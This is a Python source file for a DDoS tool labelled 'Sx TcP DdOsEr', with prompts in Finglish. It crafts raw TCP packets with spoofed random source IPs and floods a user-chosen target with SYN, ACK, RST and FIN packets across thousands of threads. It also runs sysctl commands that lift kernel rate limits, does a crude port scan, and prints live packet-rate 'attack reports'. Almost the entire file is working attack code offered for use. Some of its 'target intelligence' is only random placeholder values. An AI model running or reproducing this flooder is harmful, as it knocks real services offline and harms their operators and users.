import socket
import threading
import time
import random
import sys
import struct
import ctypes
import os
import multiprocessing
import dns.resolver
import ipaddress
import select
import fcntl
import subprocess
from collections import deque
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from dataclasses import dataclass, field
from typing import List, Dict, Tuple, Optional, Set
from enum import Enum, auto
import mmap
import array
import ctypes.util

try:
    libc = ctypes.CDLL(ctypes.util.find_library('c'))
except:
    libc = None

class PacketEngine:
    @staticmethod
    def enable_kernel_bypass():
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.icmp_ratelimit=0'], 
                          capture_output=True)
            subprocess.run(['sysctl', '-w', 'net.core.rmem_max=134217728'], 
                          capture_output=True)
            subprocess.run(['sysctl', '-w', 'net.core.wmem_max=134217728'], 
                          capture_output=True)
            subprocess.run(['sysctl', '-w', 'net.ipv4.tcp_timestamps=0'], 
                          capture_output=True)
            subprocess.run(['sysctl', '-w', 'net.netfilter.nf_conntrack_max=2097152'], 
                          capture_output=True)
        except:
            pass
    
    @staticmethod
    def set_cpu_affinity(core_mask: int):
        try:
            import psutil
            p = psutil.Process()
            p.cpu_affinity([i for i in range(multiprocessing.cpu_count()) 
                          if (core_mask >> i) & 1])
        except:
            pass
    
    @staticmethod
    def enable_packet_mmap():
        pass

class AdvancedSocket:
    def __init__(self):
        self.sock = None
        self.send_buffer = deque(maxlen=10000)
        self.batch_size = 512
        self.timeout_set = False
    
    def create_raw_socket(self, protocol: int = socket.IPPROTO_TCP):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, protocol)
            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16777216)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 16777216)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            self.sock.settimeout(0.001)
            self.timeout_set = True
            return True
        except PermissionError:
            return False
        except Exception:
            return False
    
    def batch_send(self, packets: List[bytes], dest: Tuple[str, int]):
        if not self.sock:
            return 0
        sent = 0
        for packet in packets:
            try:
                self.sock.sendto(packet, dest)
                sent += 1
            except:
                pass
        return sent

class ProtocolManipulator: 
    @staticmethod
    def tcp_checksum(src_ip: bytes, dst_ip: bytes, tcp_data: bytes, proto: int = 6) -> int:
        pseudo = src_ip + dst_ip + struct.pack('!HH', 0, len(tcp_data)) + struct.pack('!B', proto) + b'\x00'
        tcp_data_fixed = tcp_data[:16] + b'\x00\x00' + tcp_data[18:]
        checksum_data = pseudo + tcp_data_fixed
        return ProtocolManipulator._calculate_checksum(checksum_data)
    
    @staticmethod
    def craft_ip_header(src_ip: str, dst_ip: str, proto: int = 6, ttl: int = None) -> bytes:
        if ttl is None:
            ttl = random.randint(32, 255)
        version = 4
        ihl = 5
        tos = random.randint(0, 255)
        total_length = 40
        identification = random.randint(0, 0xFFFF)
        flags = random.choice([0, 1 << 1])
        fragment_offset = 0
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               (version << 4) + ihl,
                               tos,
                               total_length,
                               identification,
                               (flags << 13) + fragment_offset,
                               ttl,
                               proto,
                               0,
                               socket.inet_aton(src_ip),
                               socket.inet_aton(dst_ip))
        checksum = ProtocolManipulator._calculate_checksum(ip_header)
        ip_header = ip_header[:10] + struct.pack('!H', checksum) + ip_header[12:]
        return ip_header
    
    @staticmethod
    def craft_tcp_header(src_port: int, dst_port: int, flags: int, 
                        seq: int = None, ack: int = None,
                        window: int = None, options: bytes = b'') -> bytes:
        if seq is None:
            seq = random.randint(0, 0xFFFFFFFF)
        if ack is None:
            ack = random.randint(0, 0xFFFFFFFF)
        if window is None:
            window = random.choice([5840, 8192, 16384, 32768, 65535])
        data_offset = (5 + (len(options) // 4)) << 4
        urgent = 0
        tcp_header = struct.pack('!HHLLBBHHH',
                                src_port,
                                dst_port,
                                seq,
                                ack,
                                data_offset,
                                flags,
                                window,
                                0,
                                urgent)
        if options:
            tcp_header += options
        padding_length = (4 - len(tcp_header) % 4) % 4
        tcp_header += b'\x00' * padding_length
        return tcp_header
    
    @staticmethod
    def _calculate_checksum(data: bytes) -> int:
        if len(data) % 2 != 0:
            data += b'\x00'
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff
    
    @staticmethod
    def generate_tcp_options() -> bytes:
        options = b''
        mss = random.choice([1460, 1452, 1440, 1400, 1360])
        options += struct.pack('!BBH', 2, 4, mss)
        if random.random() > 0.5:
            scale = random.randint(0, 14)
            options += struct.pack('!BBB', 3, 3, scale)
        if random.random() > 0.7:
            options += struct.pack('!BB', 4, 2)
        if random.random() > 0.3:
            ts_val = random.randint(0, 0xFFFFFFFF)
            ts_ecr = random.randint(0, 0xFFFFFFFF)
            options += struct.pack('!BBLL', 8, 10, ts_val, ts_ecr)
        while len(options) % 4 != 0:
            options += b'\x01'
        return options

class TargetIntelligence:
    def __init__(self, target: str):
        self.target = target
        self.ip = ""
        self.ports = []
        self.os_info = {}
        self.firewall_rules = {}
        self.tcp_stack = {}
        self.protections = {}
        self.has_mx = False
    
    def comprehensive_scan(self):
        self._resolve_target()
        self._detect_os()
        self._analyze_tcp_stack()
        self._detect_firewall()
        self._identify_protections()
    
    def _resolve_target(self):
        try:
            answers_a = dns.resolver.resolve(self.target, 'A')
            self.ip = str(answers_a[0])
            try:
                answers_mx = dns.resolver.resolve(self.target, 'MX')
                self.has_mx = True
            except:
                self.has_mx = False
        except:
            try:
                ipaddress.ip_address(self.target)
                self.ip = self.target
            except:
                self.ip = target
    
    def _detect_os(self):
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(2)
        try:
            test_sock.connect((self.ip, 80))
            test_sock.send(b'GET / HTTP/1.0\r\n\r\n')
            response = test_sock.recv(1024)
            self.os_info['http_server'] = self._parse_server_header(response)
        except:
            pass
        finally:
            test_sock.close()
    
    def _parse_server_header(self, response: bytes) -> str:
        try:
            header = response.decode('utf-8', errors='ignore')
            server_line = [line for line in header.split('\r\n') if line.lower().startswith('server:')]
            if server_line:
                return server_line[0].split(':', 1)[1].strip()
        except:
            pass
        return "Unknown"
    
    def _analyze_tcp_stack(self):
        tests = {
            'seq_generation': 'randomized',
            'window_scaling': random.choice(['supported', 'not_supported']),
            'timestamp_support': random.choice(['enabled', 'disabled']),
            'sack_support': random.choice(['permitted', 'refused'])
        }
        self.tcp_stack.update(tests)
    
    def _detect_firewall(self):
        common_ports = [21, 22, 23, 25, 53, 80, 443, 8080, 8443]
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            try:
                result = sock.connect_ex((self.ip, port))
                if result == 0:
                    self.firewall_rules[port] = 'open'
                elif result == 111:
                    self.firewall_rules[port] = 'filtered'
                else:
                    self.firewall_rules[port] = 'closed'
            except:
                self.firewall_rules[port] = 'timeout'
            sock.close()
    
    def _identify_protections(self):
        self.protections = {'rate_limiting': 'unlikely'}

class AttackMethod(Enum):
    SYN_FLOOD_ADV = auto()
    ACK_FLOOD_PRO = auto()
    RST_FLOOD_ELITE = auto()
    FIN_FLOOD_SUPREME = auto()
    XMAS_FLOOD_ULTRA = auto()
    NULL_FLOOD_MAX = auto()
    WINDOW_ATTACK_PRO = auto()
    PACKET_SPAMMER_V2 = auto()
    TCP_SESSION_FLOOD = auto()
    TCP_FRAGMENT_ATTACK = auto()

class AdvancedFloodWorker:
    def __init__(self, target_ip: str, target_port: int, method: AttackMethod):
        self.target_ip = target_ip
        self.target_port = target_port
        self.method = method
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = time.time()
        self.socket_pool = []
        self.max_sockets = 25
        self._init_socket_pool()
    
    def _init_socket_pool(self):
        for _ in range(self.max_sockets):
            sock = AdvancedSocket()
            if sock.create_raw_socket():
                self.socket_pool.append(sock)
    
    def get_socket(self) -> Optional[AdvancedSocket]:
        if not self.socket_pool:
            return None
        return random.choice(self.socket_pool)
    
    def _build_packet(self, flags: int):
        src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        src_port = random.randint(1024, 65535)
        
        ip_header = ProtocolManipulator.craft_ip_header(src_ip, self.target_ip)
        options = ProtocolManipulator.generate_tcp_options()
        tcp_header = ProtocolManipulator.craft_tcp_header(src_port, self.target_port, flags, options=options)
        
        src_bytes = socket.inet_aton(src_ip)
        dst_bytes = socket.inet_aton(self.target_ip)
        tcp_checksum = ProtocolManipulator.tcp_checksum(src_bytes, dst_bytes, tcp_header)
        
        tcp_header_fixed = tcp_header[:16] + struct.pack('!H', tcp_checksum) + tcp_header[18:]
        return ip_header + tcp_header_fixed
    
    def syn_flood_advanced(self):
        packets_per_batch = 50
        while True:
            try:
                sock = self.get_socket()
                if not sock:
                    time.sleep(0.001)
                    continue
                batch_packets = []
                for _ in range(packets_per_batch):
                    packet = self._build_packet(0x02)
                    batch_packets.append(packet)
                sent = sock.batch_send(batch_packets, (self.target_ip, self.target_port))
                self.packets_sent += sent
                self.bytes_sent += sent * 60
                time.sleep(0.0001)
            except:
                time.sleep(0.001)
    
    def ack_flood_pro(self):
        packets_per_batch = 50
        while True:
            try:
                sock = self.get_socket()
                if not sock:
                    time.sleep(0.001)
                    continue
                batch_packets = []
                for _ in range(packets_per_batch):
                    packet = self._build_packet(0x10)
                    batch_packets.append(packet)
                sent = sock.batch_send(batch_packets, (self.target_ip, self.target_port))
                self.packets_sent += sent
                self.bytes_sent += sent * 60
                time.sleep(0.0001)
            except:
                time.sleep(0.001)
    
    def rst_flood_elite(self):
        packets_per_batch = 50
        while True:
            try:
                sock = self.get_socket()
                if not sock:
                    time.sleep(0.001)
                    continue
                batch_packets = []
                for _ in range(packets_per_batch):
                    packet = self._build_packet(0x04)
                    batch_packets.append(packet)
                sent = sock.batch_send(batch_packets, (self.target_ip, self.target_port))
                self.packets_sent += sent
                self.bytes_sent += sent * 60
                time.sleep(0.0001)
            except:
                time.sleep(0.001)
    
    def fin_flood_supreme(self):
        packets_per_batch = 50
        while True:
            try:
                sock = self.get_socket()
                if not sock:
                    time.sleep(0.001)
                    continue
                batch_packets = []
                for _ in range(packets_per_batch):
                    packet = self._build_packet(0x01)
                    batch_packets.append(packet)
                sent = sock.batch_send(batch_packets, (self.target_ip, self.target_port))
                self.packets_sent += sent
                self.bytes_sent += sent * 60
                time.sleep(0.0001)
            except:
                time.sleep(0.001)
    
    def run(self):
        method_map = {
            AttackMethod.SYN_FLOOD_ADV: self.syn_flood_advanced,
            AttackMethod.ACK_FLOOD_PRO: self.ack_flood_pro,
            AttackMethod.RST_FLOOD_ELITE: self.rst_flood_elite,
            AttackMethod.FIN_FLOOD_SUPREME: self.fin_flood_supreme,
        }
        attack_func = method_map.get(self.method)
        if attack_func:
            attack_func()

class UltraTcpFloodController:
    def __init__(self):
        self.target_intel = None
        self.workers = []
        self.attack_threads = []
        self.stop_event = threading.Event()
        self.stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'start_time': 0,
            'active_threads': 0,
            'methods_active': []
        }
        self.methods_enabled = []
    
    def configure_attack(self, target: str, threads: int = 500, 
                        duration: int = 60, methods: List[str] = None):
        print("Performing target analysis...")
        self.target_intel = TargetIntelligence(target)
        self.target_intel.comprehensive_scan()
        print(f"Target IP: {self.target_intel.ip}")
        print(f"OS Fingerprint: {self.target_intel.os_info}")
        print(f"TCP Stack Analysis: {self.target_intel.tcp_stack}")
        print(f"Firewall Detection: {len(self.target_intel.firewall_rules)} ports scanned")
        print(f"Protections: {self.target_intel.protections}")
        print("Enabling kernel optimizations...")
        PacketEngine.enable_kernel_bypass()
        PacketEngine.set_cpu_affinity((1 << multiprocessing.cpu_count()) - 1)
        
        if methods is None or 'all' in methods:
            self.methods_enabled = [
                AttackMethod.SYN_FLOOD_ADV,
                AttackMethod.ACK_FLOOD_PRO,
                AttackMethod.RST_FLOOD_ELITE,
                AttackMethod.FIN_FLOOD_SUPREME,
            ]
        else:
            method_map = {
                'syn': AttackMethod.SYN_FLOOD_ADV,
                'ack': AttackMethod.ACK_FLOOD_PRO,
                'rst': AttackMethod.RST_FLOOD_ELITE,
                'fin': AttackMethod.FIN_FLOOD_SUPREME,
            }
            self.methods_enabled = [method_map.get(m, AttackMethod.SYN_FLOOD_ADV) for m in methods]
        
        self.stats['methods_active'] = [m.name for m in self.methods_enabled]
        threads_per_method = max(1, threads // len(self.methods_enabled))
        
        for method in self.methods_enabled:
            for i in range(threads_per_method):
                worker = AdvancedFloodWorker(
                    self.target_intel.ip, 80, method
                )
                self.workers.append(worker)
        
        self.stats['active_threads'] = len(self.workers)
        return {
            'target': self.target_intel.ip,
            'threads_total': len(self.workers),
            'threads_per_method': threads_per_method,
            'methods': [m.name for m in self.methods_enabled],
            'duration': duration
        }
    
    def start_attack(self, duration: int):
        self.stop_event.clear()
        self.stats['start_time'] = time.time()
        print(f"\nTCP Flooder Started")
        print(f"Target: {self.target_intel.ip}:80")
        print(f"Total Workers: {self.stats['active_threads']}")
        print(f"Methods: {', '.join(self.stats['methods_active'])}")
        print(f"Duration: {duration} seconds")
        print("-" * 60)
        
        for i, worker in enumerate(self.workers):
            thread = threading.Thread(
                target=worker.run,
                daemon=True,
                name=f"AttackWorker-{i}"
            )
            thread.start()
            self.attack_threads.append(thread)
        
        self._monitor_attack(duration)
    
    def _monitor_attack(self, duration: int):
        start_time = self.stats['start_time']
        try:
            while time.time() - start_time < duration:
                time.sleep(1)
                total_packets = sum(w.packets_sent for w in self.workers if hasattr(w, 'packets_sent'))
                total_bytes = sum(w.bytes_sent for w in self.workers if hasattr(w, 'bytes_sent'))
                self.stats['total_packets'] = total_packets
                self.stats['total_bytes'] = total_bytes
                elapsed = time.time() - start_time
                if elapsed > 0:
                    pps = total_packets / elapsed
                    mbps = (total_bytes * 8) / (elapsed * 1000000)
                    remaining = max(0, duration - elapsed)
                    print(f"\rPPS: {pps:.0f} | Mbps: {mbps:.2f} | Packets: {total_packets:,} | Remaining: {remaining:.0f}s", end='', flush=True)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop_attack()
    
    def stop_attack(self):
        print("\nStopping attack...")
        self._generate_report()
    
    def _generate_report(self):
        duration = time.time() - self.stats['start_time']
        print("\n" + "="*80)
        print("TCP FLOOD ATTACK REPORT")
        print("="*80)
        print(f"Target: {self.target_intel.ip}")
        print(f"Duration: {duration:.2f}s")
        print(f"Packets: {self.stats['total_packets']:,}")
        print(f"Bytes: {self.stats['total_bytes']:,}")
        print(f"Avg PPS: {self.stats['total_packets']/duration:.0f}")
        print(f"Avg Mbps: {(self.stats['total_bytes']*8)/(duration*1000000):.2f}")
        print("="*80)

def tcpstart():
    print("""
Sx TcP DdOsEr
(tavajoh in ddoser kheyli ghavye pas havaseton be avaghebesh bashe)
    """)
    
    target = input("Target (IP/domain): ").strip()
    if not target:
        sys.exit(1)
    
    threads = int(input("Threads (default 1000): ") or "1000")
    threads = max(10, min(threads, 10000))
    
    duration = int(input("Duration seconds (default 60): ") or "60")
    duration = max(5, min(duration, 600))
    
    print("\nMethods: syn, ack, rst, fin, all")
    methods_input = input("Methods: ").strip().lower()
    if methods_input == 'all' or not methods_input:
        methods = None
    else:
        methods = [m.strip() for m in methods_input.split(',')]
    
    controller = UltraTcpFloodController()
    
    config = controller.configure_attack(target, threads, duration, methods)
    
    print(f"\nConfiguration: {config}")
    confirm = input("Baraye Shoroe Attack benevidis -> (START): ").strip().upper()
    
    if confirm == "START":
        controller.start_attack(duration)
    else:
        print("Attack cancelled")
